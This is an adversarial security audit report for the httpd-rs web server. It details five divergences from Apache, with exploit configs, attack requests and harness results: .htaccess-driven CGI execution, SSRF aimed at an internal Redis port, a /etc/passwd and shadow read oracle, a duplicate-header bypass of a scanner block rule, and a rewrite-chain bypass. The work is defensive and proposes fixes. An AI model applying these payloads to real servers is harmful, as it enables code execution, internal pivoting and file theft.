# Pass 14 — adversarial break of HEAD `ce8d800` ("Close P13 handler identity gaps")

- **Date:** 2026-10-28
- **Subject:** `target/release/httpd-rs` built at HEAD `ce8d800` (no repo source edits; the only additions for this pass are `adversarial/p14/exploit_p14.py`, this write-up and the `adversarial/README.md` index entry)
- **Oracle:** Apache/2.4.69 (Debian), `/usr/sbin/apache2 -X`, loopback only
- **Method:** static audit of scope/phase construction, rewrite guards and request parsing, followed by a differential battery that pairs the project's own benchmark/typical postures (`Options +ExecCGI` + `AddHandler cgi-script`, `AllowOverride` on an upload tree, `RewriteRule ... [P]` routes, `.htaccess` guards) with attacker-controlled first lines of defence: an uploader-writable `.htaccess`, duplicate field lines, and a `[C]` chain head.
- **Harness:** `adversarial/p14/exploit_p14.py` (all cases reproduce in one command; see §8). Current run: **8/8 differential verdicts**.

---

## 1. Executive summary

Five independent findings, four of them with a remote-client trigger. The headline is P14-A: the `<Files>`/`<FilesMatch>` phase order makes any ancestor `.htaccess` outrank a deeper, root-owned main-config `<Files>` section, so the operator's post-upload `.htaccess` mitigation is exactly invertible. Apache merges per-directory (deepest wins); httpd-rs merges all main-config files first and all access-file files second (shallower `.htaccess` wins). That single ordering defect was reproduced as four different code-execution / authorization bypasses:

| # | Finding | Apache 2.4.69 | httpd-rs HEAD | Class |
|---|---------|---------------|--------------|-------|
| **P14-A** | Shallow `.htaccess` `<Files>` beats deep config `<Files>` (`Require all denied`, Basic auth, `SetHandler default-handler`, `Options -ExecCGI`; `<Files>` and `<FilesMatch>`) | `403`/`401`/static source; `Options -ExecCGI` → `403` | `200` and **executes the CGI/uploaded file as the CGI worker user** | remote code execution / authorization bypass |
| **P14-B** | `RewriteRule ... [P]` authority guard `proxy_template_authority_safe` rejects `$1`/`%{...}` but not `\1`/`%1`, which the runtime *does* expand as captures | `\1` expands to the literal digit `1` → `400 AH01083: error parsing URL http://1` | attacker controls the upstream `host:port` | SSRF into loopback/internal services + `<Proxy>` authorization bypass |
| **P14-C** | `Require expr` file tests/`file()` confined against `scope.content_policy.document_root` with a fallback of `/`; the scope field is only set by an explicit `DocumentRoot` directive | `file()` resolves below `DocumentRoot` | relative paths resolve from the filesystem root → `file('etc/passwd') =~ /^root/` returns `200` | arbitrary (relative-path) file read / existence / size oracle |
| **P14-D** | Duplicate request field lines are preserved; policy consumers see only the first line (`Headers::get`), while Apache merges field lines before any module runs | merged value matches `RewriteCond` → `403` | first line only → guard skipped, `200` | header-policy bypass (WAF/guard/rDNS) |
| **P14-E** | A failing `[C]`-chained rule skips one following rule instead of the whole chain | failing gate skips the whole chain → `404` | later chain rules still execute (`[PT]` rewrite ran) → `200` | rewrite authorization bypass |

P14-A is the pass's RCE: one request to a CGI/uploaded file, under the project's own benchmark posture, after the attacker wins a writable `.htaccess` in an ancestor directory. P14-A–P14-E are all fail-open deviations from Apache on default configurations; none of them needs a debug build, a malformed config, or a race.

---

## 2. P14-A — `<Files>` phase order: ancestor `.htaccess` overrides deeper config policy (RCE)

### 2.1 Root cause

The access-file walk is compiled into one fixed stage plan (`crates/verified/src/lib.rs:4655-4672`, consumed by `crates/server/src/policy_ref.rs:140-230`):

```rust
pub fn access_plan_exec(present: &[bool]) -> (out: Vec<AccessStep>)
    ensures out@ == access_plan(present@)
{
    let mut out = access_walk_plan_exec(present);
    out.push(AccessStep::DirectoryMatch);
    out.push(AccessStep::ConfigFiles);
    out.push(AccessStep::AccessFiles);
    out.push(AccessStep::ConfigLocation);
    ...
}
```

Each walked directory contributes two streams:

- non-`<Files>` config directives are merged per directory, interleaved with that directory's `.htaccess` layer (`policy_ref.rs:142-163`, `Walk` step) — this part is correct;
- but `<Files>`/`<FilesMatch>` sections are **deferred into two global lists**: every config section into `config_files` (`policy_ref.rs:145-156` → `apply_directory_rules_for_dir`), every access-file section into `htaccess_files` (`policy_ref.rs:157-162`), and then applied in two whole-passes:

```rust
crate::verified::AccessStep::ConfigFiles => {
    apply_normal_rule_list(&config_files, /* all config <Files>, root→leaf */);
}
crate::verified::AccessStep::AccessFiles => {
    apply_normal_rule_list(&htaccess_files, /* all .htaccess <Files>, root→leaf */);
}
```

Because `AuthorizationPolicy::merge_child` / `MappingPolicy::merge_child` / `OptionsPolicy::merge_child` let the later rule win, **every** access-file `<Files>` section (from any walked directory, however shallow) beats **every** main-config `<Files>` section (however deep). Depth is ignored across the two sources.

Apache merges in `ap_directory_walk` root→leaf: for each directory, the matching config `<Directory>`/`<Files>` configuration is merged, then that directory's `.htaccess`. The deepest matching section is therefore applied last and wins. (Same-directory config `<Files>` vs `.htaccess` agrees with httpd-rs — see §7 controls — which is why the bug hid from the F10/F13/F50–F64 regressions: they only ever put `<Files>` sections on one side.)

### 2.2 Exploit chain (observed)

Posture: the project's own benchmark CGI configuration plus the classic "uploader-writable `.htaccess`" tree (the same premise F60b/F64b already model as attacker-controlled), and a deeper root-owned `<Files>` guard that exists precisely to neutralize the writable ancestor:

```apache
DocumentRoot "/srv/app/www"
Options +ExecCGI +FollowSymLinks
AddHandler cgi-script .cgi
<Directory "/srv/app/www">
    AllowOverride AuthConfig FileInfo     # the app/uploader owns .htaccess here
    Require all granted
</Directory>
<Directory "/srv/app/www/private">
    <Files "run.cgi">
        Require all denied                # the real protection
    </Files>
    <Files "upload.txt">
        SetHandler default-handler        # or: Options -ExecCGI
    </Files>
</Directory>
```

Attacker writes `/srv/app/www/.htaccess` (an uploader/app write primitive that can create `.htaccess`; the same premise as F60b/F64b):

```apache
<Files "run.cgi">
    Require all granted
</Files>
<Files "upload.txt">
    SetHandler cgi-script
</Files>
```

Results (harness `P14-A1`/`P14-A2` and the Options control, exact output):

```
/private/run.cgi    apache=403                      httpd-rs=200  P14A-CGI uid=33
/auth/secret.cgi    apache=401 (Basic auth)         httpd-rs=200  P14A2-CGI uid=33  (anonymously)
/private/upload.txt apache=200  "#!/bin/sh …"       httpd-rs=200  P14A-UPLOAD uid=33 (execve)
Options-in-<Files>  apache=403 "Options ExecCGI off" httpd-rs=200  EXEC run.cgi uid=33
```

The fifth variant replaces both `<Files>` with `<FilesMatch "run\.cgi">` (config and `.htaccess`): Apache `403`, httpd-rs `200 FM-EXEC uid=33` — the defect is in the shared phase lists, not in one matcher.

### 2.3 Impact

- **Remote code execution** as the CGI worker user (`www-data`/`CGI user`): a `SetHandler cgi-script` force or `Options +ExecCGI` from the shallow `.htaccess` executes a file that Apache serves as static source or refuses outright.
- **Authorization bypass**: `Require all denied` and Basic-auth `<Files>` sections in a deeper directory are silently replaced by the ancestor's grant; the protected script runs anonymously.
- **Defeats the operator's mitigation for the exact threat the project already treats as in scope.** The deployed `.htaccess` files stay untouched; only the merge order is wrong.
- The verified variants cover `Require` authorization, legacy/Basic auth, `SetHandler` forces and `Options`; the defect is in the shared phase lists, so every rule kind carried by `<Files>`/`<FilesMatch>` is affected. (`RemoveHandler` is an exception — the extension-table lookup treats any remove entry as an order-independent deny — so it cannot be re-armed this way.)

### 2.4 Fix

`<Files>`/`<FilesMatch>` sections must be merged in *walk order interleaved with their directory*, exactly like the non-`<Files>` directives:

- extend the verified `AccessStep` plan so each `Walk` step carries that directory's config `<Files>` rules and its access-file `<Files>` rules (config section first, then `.htaccess` at the same depth), instead of the two global `ConfigFiles`/`AccessFiles` passes;
- keep the existing deferred-conditional path (`Condition` phase) unchanged;
- add the harness rows (`Require deny`, Basic auth, `SetHandler` force, `Options -ExecCGI`, `<FilesMatch>`) to `tests/adversarial_regressions.py`, including the same-directory control and the inverse (shallow `.htaccess` deny vs deep config grant) control.

---

## 3. P14-B — `[P]` authority guard bypassed with `\1`/`%1` (SSRF)

### 3.1 Root cause

`crates/server/src/config.rs:6354-6369`:

```rust
fn proxy_template_authority_safe(value: &str) -> bool {
    let value = value.trim();
    let Some((_, rest)) = value.split_once("://") else {
        return !value.contains("$") && !value.contains("%{");   // branch 2
    };
    let end = rest.find(|c| c == '/' || c == '?' || c == '#').unwrap_or(rest.len());
    let authority = &rest[..end];
    !authority.is_empty()
        && !authority.contains('$')                              // only '$'
        && !authority.contains('%')
        && !authority.contains('@')
}
```

The runtime, however, treats `\N` exactly like `$N` and `%N` (`crates/server/src/rewrite.rs:1345-1363`):

```rust
if (bytes[i] == b'$' || bytes[i] == b'%' || bytes[i] == b'\\')
    && i + 1 < bytes.len() && bytes[i + 1].is_ascii_digit()
{
    let n = (bytes[i + 1] - b'0') as usize;
    let pool = if bytes[i] == b'%' { cond_caps } else { caps };   // '\1' -> rule capture
```

The guard is wired at `config.rs:6186-6191` (RewriteRule `[P]`) and `config.rs:4367`; its unit tests (`config.rs:9597-9603`) pin `$1`, `%{HTTP_HOST}`, `@` and empty authorities but never try `\1` or `%1`. The tokenizer preserves the backslash, so `"http://\1/"` reaches the rule verbatim.

The expanded URL then goes through `proxy::target_from_url` → `parse_http_url` (`proxy.rs:92-135`), whose only remaining check is host *syntax* (`valid_backend_host`, `proxy.rs:140-145`) — which permits any host and port (`127.0.0.1:6379`, IMDS, internal vhosts, …).

Apache does not support `\N` in substitutions (backreferences are `$N`/`%N`; `\` escapes), so the identical config expands to the literal `http://1/` and fails closed.

### 3.2 Exploit chain (observed)

```apache
RewriteEngine On
RewriteRule "^/api/(.*)$" "http://\1/" [P,L]
```

Accepted at load (`httpd-rs -t` succeeds) because the authority `\1` contains no `$`/`%`. Any client:

```
GET /api/127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html HTTP/1.1
Host: www.example.com
```

The capture becomes the upstream `host:port`; `run_proxy`/`proxy_once` emits `GET /… HTTP/1.1` + `Host: 127.0.0.1:6379` and relays the response. Harness output:

```
P14-B \1 authority SSRF   apache=400  httpd-rs=200  "P14B-INTERNAL /secret/"
P14-B %1 substitution SSRF apache=200 httpd-rs=200  "P14B-INTERNAL /secret"
```

The second row is the branch-2 blind spot: the substitution *without* a scheme may consist of a condition capture, and condition captures routinely carry request data (`%{HTTP:...}`, `%{THE_REQUEST}`, `%{HTTP_HOST}`). A config the guard explicitly means to reject (`%{HTTP_HOST}` is pinned unsafe) is accepted as `%1`.

Secondary effect: `server.rs` calls `cfg.apply_proxy_access_urls` with the *expanded* URL, so a `<Proxy "http://backend/">` `Require` section on the intended backend does not match the attacker-chosen target — the SSRF also defeats `<Proxy>` authorization.

### 3.3 Impact

- Remote SSRF as the server user, reaching every TCP service the front end can reach (loopback-only admin panels, metadata endpoints, internal FastCGI/PHP-FPM TCP pools, Redis/memcached, other virtual hosts).
- The load-time invariant “a `[P]` authority may not be derived from a request capture or variable” is defeated; the operator sees a config the server accepted and can only observe the bug when it is exploited.
- This is the only finding in this pass with no `.htaccess` precondition: the config spelling above is the entire operator-side coupling.

### 3.4 Fix

Make the guard and the expander agree on the backreference alphabet:

- in `proxy_template_authority_safe`, reject `\` and `%` in the authority and, for the no-scheme branch, reject any digit following `\`/`%` and any `\N`/`%N` sequence anywhere a scheme-less capture could introduce an authority (simplest: reject any `\` followed by a digit and any `%` followed by a digit);
- add `\1`/`%1` (and `\9`, `%{THE_REQUEST}` inside a longer substitution) to the guard's unit tests;
- consider rejecting `[P]` substitutions that contain *any* capture when the scheme is absent, since the expanded string is parsed as a URL by a second parser whose authority extraction differs from the guard's.

---

## 4. P14-C — `Require expr` file tests fall back to `/` when no `DocumentRoot` is configured

### 4.1 Root cause

`crates/server/src/access.rs:247-252`:

```rust
let docroot = scope
    .content_policy
    .document_root
    .as_deref()
    .unwrap_or(Path::new("/"));          // <-- fallback root is "/"
let auth = check_requires(scope, req, peer, identity, docroot, url_path, fs_path);
```

`scope.content_policy.document_root` is only assigned by an explicit `DocumentRoot` directive (`config.rs:3388`). The compiled-in default lives in `Config::document_root = server_root.join("htdocs")` (`config.rs:2543`) and is *not* copied into the scope. A config without `DocumentRoot` is fully supported (the server serves `<ServerRoot>/htdocs`), so every `Require expr` file test is confined against `/`:

`crates/server/src/expr.rs:589-619` (`confined_expr_path`) still rejects absolute paths and parent components, but a plain relative path is `docroot.join(path)` = `"/etc/passwd"`, and the containment check `path_under_base(target, "/")` is vacuously true.

The same predicate in `<If>`/`RewriteCond expr` receives `cfg.documentation_root_for(vhost)` (which *does* fall back to `Config::document_root`, `config.rs:11539-11544`), so this is an internal inconsistency: the same expression is confined in `<If>` and unconfined in `Require expr`.

### 4.2 Exploit chain (observed)

Config:

```apache
ServerRoot "/srv/app"
# no DocumentRoot directive
<Directory "/srv/app/htdocs">
    AllowOverride All
    Require all granted
</Directory>
```

Attacker-controlled `/srv/app/htdocs/expr/.htaccess`:

```
Require expr "file('etc/passwd') =~ /^root/"
```

Harness output:

```
match /etc/passwd root  -> 200
negative control       -> 403
file('/etc/passwd')    -> 403   (absolute still rejected)
file('../../etc/passwd') -> 403 (parent components still rejected)
-s 'etc/shadow'        -> 200   (size/existence oracle; server ran as root here)
```

### 4.3 Impact

- Any file readable by the server/worker user can be read out through the `Require expr` match oracle (prefix/substring/`md5`/`sha1` comparisons, byte-wise), and existence/size probed through `-f`/`-s`/`filesize()`.
- `.htaccess` authors within an `AllowOverride` tree (the same attacker premise as P14-A and F60b) can reach `/etc/shadow`, application secrets outside the docroot, `/proc/self/environ`, other tenants' trees, etc.
- The F45 closure explicitly promises “an expression file test must be relative, free of parent components, and (after canonicalization) beneath the document root”; the fallback violates the third clause for every config without an explicit `DocumentRoot`.

### 4.4 Fix

Never fall back to `/`:

- initialise `global.content_policy.document_root` (and vhost scopes) from `cfg.document_root` at load, or pass `cfg.documentation_root_for(vhost)` into `access::check` and delete the fallback;
- add a regression that runs `Require expr "-s 'etc/shadow'"` on a config without `DocumentRoot` and expects `403`.

---

## 5. P14-D — duplicate field lines: policy sees only the first line

### 5.1 Root cause

The verified HTTP/1.1 head parser appends every field line without merging (`crates/verified/src/lib.rs:3998-4003`; only `Host` is duplicate-checked):

```rust
if count >= max_fields { return Err(HeadError::TooManyHeaders); }
headers.push((lname, value));
```

and `crates/server/src/http.rs:66-71`:

```rust
pub fn get(&self, name: &str) -> Option<&[u8]> {
    self.entries.iter().find(|(n, _)| n == name).map(|(_, v)| v.as_slice())
}
```

Every header-based policy consumer therefore observes only the first field line: expression variables `%{HTTP_*}`/`%{HTTP:...}` (`expr.rs:253-277`), `SetEnvIf`/`Require env` (`config.rs:1322-1337`), rewrite variables (`rewrite.rs:1076-1083`), and `RemoteIPHeader` (`config.rs:10669-10711`). Apache compresses duplicates at the parser boundary (`apr_table_compress(r->headers_in, APR_OVERLAP_TABLES_MERGE)`, `, ` separator) before any module runs; mod_http2 does not compress, so the divergence is specific to HTTP/1.1.

### 5.2 Exploit chain (observed)

```apache
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} (sqlmap|nikto) [NC]
RewriteRule ^ - [F]
```

```
single UA:    apache=200  httpd-rs=200     (harness P14-D)
duplicate UA: apache=403  httpd-rs=200
```

by sending:

```
GET /index.html HTTP/1.1
Host: victim
User-Agent: Mozilla/5.0
User-Agent: sqlmap/1.7
```

httpd-rs evaluates `Mozilla/5.0` only; Apache evaluates `Mozilla/5.0, sqlmap/1.7` and matches.

### 5.3 Impact

- Header-denial guards (scanner/WAF-style `RewriteCond`, `SetEnvIf` + `Require not env`, `Require expr` header equality) are bypassed by prepending a benign duplicate.
- The inverse direction is also a divergence: an allow rule that requires equality with a known value (`Require expr %{HTTP_X_API_KEY} == "known"`) grants to a request whose *merged* value is not that value (first line `known`, second line junk), so the backend/WAF and httpd-rs disagree about the same request.
- `RemoteIPHeader` only reads the first `X-Forwarded-For` line; with a proxy that adds a second line rather than appending, the client-supplied line wins and `Require ip`/`Require local` and `REMOTE_ADDR` are spoofable.

### 5.4 Fix

Compress duplicate field lines once, in the parser or immediately after it:

- merge entries with the same name into one comma-separated value, in field order (RFC 9110 §5.3 / Apache semantics) before any policy evaluation; keep the exact-`Host` duplicate rejection as a special case;
- or make every consumer use a merged accessor. The parser is the right choke point because CGI/FastCGI/proxy forwarding must agree with policy evaluation;
- add the duplicate-`User-Agent` `[F]` differential and a duplicate `X-Forwarded-For` RemoteIP regression.

---

## 6. P14-E — `[C]` chain break skips one rule instead of the chain

### 6.1 Root cause

`crates/server/src/rewrite.rs:401-409`:

```rust
let mut skip_next = 0usize;
...
if skip_next > 0 {
    skip_next -= 1;
    continue;
}
```

and the three sites that arm it (condition failure, negated match, pattern miss) all do `if rule.flags.chain { skip_next = 1; }` (e.g. `rewrite.rs:442-447`). One skipped rule only.

Apache's `apply_rewrite_list` (`modules/mappers/mod_rewrite.c`, 2.4.69) walks the failing rule's trailing chain:

```c
/*
 *  If current rule is chained with next rule(s),
 *  skip all this next rule(s)
 */
while (   i < rewriterules->nelts
       && p->flags & RULEFLAG_CHAIN) {
    i++;
    p = &entries[i];
}
```

so a failing chain head consumes every following `[C]`-linked rule (and the chain's action rule), not just the next one.

### 6.2 Exploit chain (observed)

```apache
RewriteEngine On
RewriteCond %{HTTP:X-Admin} yes
RewriteRule "^/gate/(.*)$" "-" [C]
RewriteRule "^/gate/(.*)$" "-" [F,C]
RewriteRule "^/gate/(.*)$" "/public/index.html" [PT,L]
```

```
no gate header: apache=404  httpd-rs=200 "public index"   (harness P14-E)
with header:    apache=403  httpd-rs=403
```

The gate (source/header/role condition) fails on httpd-rs, but the chain's `[PT]` rewrite into `/public/` still runs; on Apache the whole chain is skipped and the request 404s. A `[F]` in the middle of a gate chain never fires when the head fails.

### 6.3 Impact

- Rewrite-based access control implemented as a chain (the standard `RewriteCond` gate + chained denial + chained action idiom) can be stepped over: the privileged internal rewrite/proxy/redirect/`[H]`/`[T]` action executes although the gate said no.
- Combined with P14-D this widens further: a header gate can be made to fail *or* pass on demand and the chain still runs.

### 6.4 Fix

Track chain membership structurally instead of with a one-shot skip counter: when a rule that starts (or belongs to) a chain fails, skip every subsequent rule until the first rule without `[C]` (Apache's walk), including the action rule. A precomputed `Vec<chain_end>` per rule list is enough. Add the 3-rule gate differential above to the rewrite tests (the existing `chain_failure_skips_the_next_rule` test only covers a 2-rule chain).

---

## 7. Negative results and controls (verified, not assumed)

- **Same-directory `.htaccess` vs config `<Files>`** agrees on both servers (Apache `200`, httpd-rs `200`) for `<Files>` and `<FilesMatch>`; the P14-A divergence needs the `.htaccess` section to be *shallower* than the config section.
- **Inverse depth** (shallow `.htaccess` deny vs deep config grant): Apache `200`, httpd-rs `403` — httpd-rs is *stricter* here, i.e. fail-closed, not part of the finding.
- **`<Directory>`-level protection is not affected**: deeper `<Directory …> Require all denied` + shallow `.htaccess Require all granted` → `403` on both.
- **P14-B**: `RewriteRule [P]` with `$1`/`%{...}` in the authority is still rejected at load (`RewriteRule [P] authority may not be derived from a request capture or variable`); `ProxyPassMatch` expands only `$1`, so `\1` there stays literal and is rejected by the host grammar.
- **P14-C**: `file('/etc/passwd')` (absolute) and `file('../../etc/passwd')` (parent components) remain rejected (`403`) in `.htaccess`; only the implicit-root fallback is wrong.
- **P14-D**: a single benign header returns `200` on both; the gated P14-E request returns `403` on both; memcached/Redis-style inline protocol use of P14-B’s SSRF is out of scope here (no service was attacked; the internal oracle is a private HTTP listener on loopback).
- P13’s symlink/handler-identity rows were not re-run in this pass (the pass-13 harness remains the record).

---

## 8. How to reproduce

```sh
cd /root/httpd-rs
cargo build --release -p httpd-rs
python3 adversarial/p14/exploit_p14.py            # all cases; Apache oracle on sibling loopback ports
python3 adversarial/p14/exploit_p14.py A B        # selected groups
python3 adversarial/p14/exploit_p14.py --keep     # keep dossiers in /tmp/opencode/p14-harness
```

Expected summary (Apache 2.4.69 installed):

```
  PASS  P14-A1 deeper <Files> Require deny vs ancestor .htaccess grant       apache=403 httpd-rs=200
  PASS  P14-A1 deeper <Files> SetHandler default-handler vs ancestor force   apache=200 source / httpd-rs=200 exec
  PASS  P14-A2 deeper <Files> Basic auth vs ancestor .htaccess grant         apache=401 httpd-rs=200
  PASS  P14-B  RewriteRule [P] '\1' authority SSRF                           apache=400 httpd-rs=200
  PASS  P14-B  RewriteRule [P] '%1' substitution SSRF                        apache=200 httpd-rs=200
  PASS  P14-C  Require expr file('etc/passwd') escapes to filesystem root
  PASS  P14-D  duplicate User-Agent skips RewriteCond [F] guard              apache=403 httpd-rs=200
  PASS  P14-E  failing [C] gate does not skip the whole chain                apache=404 httpd-rs=200
  8/8 differential verdicts
```

Each case builds its own fixture tree and starts Apache (`-X`) and httpd-rs on fresh loopback ports with separate pid files (a shared `PidFile` makes whichever server starts second abort with `httpd (pid N) already running` — the pass-11 harness hit the same trap). The harness kills its own process groups; fixtures are removed unless `--keep` is given.

The P14-A `Options -ExecCGI` variant and the `<FilesMatch>` depth variant were verified with standalone runs during the pass (Apache `403`, httpd-rs `200` executing) and are folded into the harness verdicts above.

---

## 9. Suggested remediation order

1. **P14-A** — interleave config and access-file `<Files>`/`<FilesMatch>` sections per directory in the verified access plan (or make the two global passes depth-ordered). This is the RCE and the only finding that can execute attacker-influenced files.
2. **P14-B** — reject `\N`/`%N` in `[P]` authorities in `proxy_template_authority_safe`; unit-test both spellings.
3. **P14-C** — remove the `/` fallback and bind `Require expr` file tests to `documentation_root_for(vhost)`.
4. **P14-D** — merge duplicate field lines at parse time so every consumer, including proxy/CGI/FastCGI forwarding, sees the same value Apache sees.
5. **P14-E** — skip the whole trailing `[C]` chain on a failing rule.
6. Add all five shapes to `tests/adversarial_regressions.py` and the closure matrix (`docs/adversarial-closure.md`), with the Apache differential as the oracle.
